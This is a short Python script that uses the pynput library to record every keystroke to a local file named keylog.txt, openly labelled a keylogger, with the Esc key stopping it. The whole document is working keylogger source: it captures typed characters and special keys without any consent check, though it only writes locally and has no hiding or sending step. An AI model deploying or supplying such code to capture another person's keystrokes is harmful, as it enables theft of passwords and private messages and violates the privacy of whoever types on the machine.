from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")
        
        if key == keyboard.Key.esc:
            #Stop listener
            print("[*] Keylogger stopped by user.")
            return False

def start_keylogger():
    listener = keyboard.Listener(on_press = on_press)
    listener.start()